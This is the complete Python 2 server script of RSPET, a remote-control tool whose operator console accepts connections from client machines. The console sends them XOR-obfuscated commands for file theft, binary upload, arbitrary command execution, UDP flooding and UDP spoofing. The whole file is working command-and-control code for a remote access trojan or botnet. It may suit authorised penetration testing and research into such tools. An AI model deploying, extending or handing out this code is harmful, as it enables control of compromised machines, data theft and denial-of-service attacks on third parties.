#!/usr/bin/env python2
# -*- coding: <UTF-8> -*-
"""rspet_server.py: RSPET's Server-side script."""
from __future__ import print_function
from sys import argv
from sys import exit as sysexit
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as sock_error
from datetime import datetime
from thread import start_new_thread
from threading import Thread
import json
from Plugins.mount import Plugin
import tab


class Console(object):
    """Class to interface with the server."""
    prompt = "~$ " # Current command prompt.
    states = {} # Dictionary that defines available states.
    state = "basic" #CLI "entry" state.
    quit_signal = False

    def __init__(self, max_conns=5):
        """Start server and initialize states."""
        self.max_conns = max_conns
        self.server = Server()
        #If done directly @ Class attributes, Class funcs are not recognised.
        Console.states['basic'] = Console._basic
        Console.states['connected'] = Console._connected
        Console.states['multiple'] = Console._multiple
        Console.states['all'] = Console._all

    def trash(self):
        """Delete Console."""
        self.server.trash()

    def loop(self):
        """Main CLI loop"""
        self._logo()
        try:
            start_new_thread(self.server.loop, ())
        except sock_error:
            print("Address is already in use")
            sysexit()

        while not Console.quit_signal:
            try:
                cmd = raw_input(Console.prompt)
            except KeyboardInterrupt:
                raise KeyboardInterrupt

            cmdargs = cmd.split(" ")
            #"Sanitize" user input by stripping spaces.
            cmdargs = [x for x in cmdargs if x != ""]
            if cmdargs == []: #Check if command was empty.
                continue
            cmd = cmdargs[0]
            del cmdargs[0]
            #Execute command.
            tmp_state = self.server.execute(cmd, cmdargs)
            try:
                Console.states[tmp_state](self) #State transition.
            except KeyError: #If none is returned make no state change.
                continue

    def _basic(self):
        self.server.clean()
        Console.prompt = "~$ "
        Console.state = "basic"

    def _connected(self):
        try:
            Console.prompt = "[%s]~$ " % self.server.selected[0].ip
        except IndexError:
            pass
        else:
            Console.state = "connected"

    def _multiple(self):
        if len(self.server.selected) != 0:
            Console.prompt = "[MULTIPLE]~$ "
            Console.state = "multiple"

    def _all(self):
        if len(self.server.selected) != 0:
            Console.prompt = "[ALL]~$ "
            Console.state = "multiple"

    def _logo(self):
        """Print logo and Authorship/Licence."""
        print(r"#####################################################")
        print(r"__________  _________________________________________")
        print(r"\______   \/   _____/\______   \_   _____/\__    ___/")
        print(r" |       _/\_____  \  |     ___/|    __)_   |    |   ")
        print(r" |    |   \/        \ |    |    |        \  |    |   ")
        print(r" |____|_  /_______  / |____|   /_______  /  |____|   ")
        print(r"        \/        \/                   \/            ")
        print(r"")
        print(r" -Author: panagiks (http://panagiks.xyz)")
        print(r" -Co-Author: dzervas (http://dzervas.gr)")
        print(r" -Licence: MIT @ panagiks")
        print(r"#####################################################")
        print(r"")


class Server(object):
    """Main class of the server. Manage server socket, selections and call plugins."""
    hosts = [] # List of hosts
    selected = [] # List of selected hosts
    plugins = [] # List of active plugins
    #config = {} # Reserved for future use (dynamic plug-in loading).

    def __init__(self, max_conns=5, ip="0.0.0.0", port="9000"):
        """Starts to listen on socket"""
        self._log("L", "Session Start.")
        self.ip = ip
        self.port = port
        self.max_conns = max_conns
        self.sock = socket(AF_INET, SOCK_STREAM)

        try:
            self.sock.bind((ip, int(port)))
            self.sock.listen(max_conns)
            self._log("L", "Socket bound @ %s:%s." %(self.ip, self.port))
        except sock_error:
            print("Something went wrong during binding & listening")
            self._log("E", "Error binding socket @ %s:%s." %(self.ip, self.port))
            sysexit()

        with open("config.json") as json_config:
            self.config = json.load(json_config)

        for plugin in self.config["plugins"]:
            try:
                __import__("Plugins.%s" % plugin)
                self._log("L", "%s plugin loaded." % plugin)
            except ImportError:
                self._log("E", "%s plugin failed to load." % plugin)

    def trash(self):
        """Safely closes all sockets"""
        for host in self.hosts:
            host.trash()
        self.clean()
        self.sock.close()

    def _log(self, level, action):
        timestamp = datetime.now()
        with open("log.txt", 'a') as logfile:
            logfile.write("%s : [%s/%s/%s %s:%s:%s] => %s\n" %(level,
                                                               str(timestamp.day),
                                                               str(timestamp.month),
                                                               str(timestamp.year),
                                                               str(timestamp.hour),
                                                               str(timestamp.minute),
                                                               str(timestamp.second),
                                                               action))

    def loop(self):
        """Main server loop. Better call it on its own thread"""
        while True:
            try:
                (csock, (ip, port)) = self.sock.accept()
                self._log("L", "New connection from %s:%s" % (str(ip),
                                                              str(port)))
            except sock_error:
                raise sock_error
            self.hosts.append(Host(csock, ip, port))

    def select(self, ids=None):
        """Selects given host(s) based on ids

        Keyword argument:
        ids     -- Array of ids of hosts. Empty array unselects all. None
        selects all
        """
        flag = False
        if ids is None:
            self.selected = self.hosts
        else:
            self.selected = []
            for i in ids:
                i = int(i)
                try:
                    self.selected.append(self.hosts[i])
                except IndexError:
                    flag = True
        if flag:
            print("One or more host IDs were invalid. Continuing with valid hosts ...")
        return self.selected

    def get_selected(self):
        """
        Interface function. Return selected hosts.
        """
        return self.selected

    def get_hosts(self):
        """
        Interface function. Return all hosts.
        """
        return self.hosts

    def execute(self, cmd, args):
        """Execute function on all client objects.

        Keyword argument:
        cmd     -- Function to call for each selected host.
        Function signature myfunc(Host, args[0], args[1], ...)
        It should accept len(args) - 1 arguments
        args    -- Arguments to pass to the command function"""

        state = None
        try:
            if Console.state in Plugin.__cmd_states__[cmd]:
                try:
                    state = Plugin.__server_cmds__[cmd](self, args)
                except KeyError:
                    raise KeyError
            else:
                print("Command used out of scope.")
        except KeyError:
            print("Command not found. Try help for a list of all commands!")
        return state

    def help(self, args):
        """Print all the commands available in the current interface allong with
        their docsting."""
        if len(args) == 0:
            print("Server commands:")
            if Plugin.__server_cmds__ is not None:
                for cmd in Plugin.__server_cmds__:
                    if Console.state in Plugin.__cmd_states__[cmd]:
                        print("\t%s: %s" % (cmd, Plugin.__server_cmds__[cmd].__doc__))
        else:
            print("Command : %s" % args[0])
            try:
                print("Syntax : %s" % Plugin.__help__[args[0]])
            except KeyError:
                print("Command not found! Try help with no arguments for a list of all command available in current scope.")

    def clean(self):
        """Remove hosts taged for deletion and unselect all selected hosts."""
        for host_id in range(len(self.hosts)):
            if self.hosts[host_id].deleteme:
                self.hosts[host_id] = None

        self.hosts = [a for a in self.hosts if a is not None]

        self.select([])


    def quit(self):
        """
        Interface function. Handle a Quit signal.
        """
        Console.quit_signal = True

class Host(object):
    """Class for hosts. Each Host object represent one host"""
    command_dict = {
        'killMe'     : '00000',
        'getFile'    : '00001',
        'getBinary'  : '00002',
        'sendFile'   : '00003',
        'sendBinary' : '00004',
        'udpFlood'   : '00005',
        'udpSpoof'   : '00006',
        'command'    : '00007',
        'KILL'       : '00008'
    }

    def __init__(self, sock, ip, port):
        """Accept the connection and initialize variables"""
        self.deleteme = False
        self.sock = sock
        self.ip = ip
        self.port = port

        tmp = self.recv().split("-")
        self.version = tmp[0]
        self.type = tmp[1]

    def trash(self):
        """Gracefully delete host."""
        if not self.deleteme:
            try:
                self.send(Host.command_dict['killMe'])
            except sock_error:
                pass
            self.purge()

    def purge(self):
        """Delete host not so gracefully."""
        self.sock.close()
        self.deleteme = True

    def __eq__(self, other):
        """Check weather two sockets are the same socket."""
        return self.sock == other.sock

    def send(self, msg):
        """Send message to host"""
        if msg is not None and len(msg) > 0:
            try:
                self.sock.send(self._enc(msg))
            except sock_error:
                raise sock_error

    def recv(self, size=1024):
        """Receive from host"""
        if size > 0:
            try:
                return self._dec(self.sock.recv(size))
            except sock_error:
                raise sock_error

    def _enc(self, data):
        """Obfuscate message (before sending)"""
        out = bytearray(data)
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

    def _dec(self, data):
        """Deobfuscate message (after receiving)"""
        out = bytearray(data)
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out


def main():
    """Main function."""
    try:
        cli = Console(int(argv[1]))
    except IndexError:
        cli = Console()
    try:
        cli.loop()
    except KeyError:
        print("Got KeyError")
        cli.trash()
        del cli
        sysexit()
    except KeyboardInterrupt:
        cli.trash()
        del cli
        sysexit()
    cli.trash()
    del cli

if __name__ == "__main__":
    main()
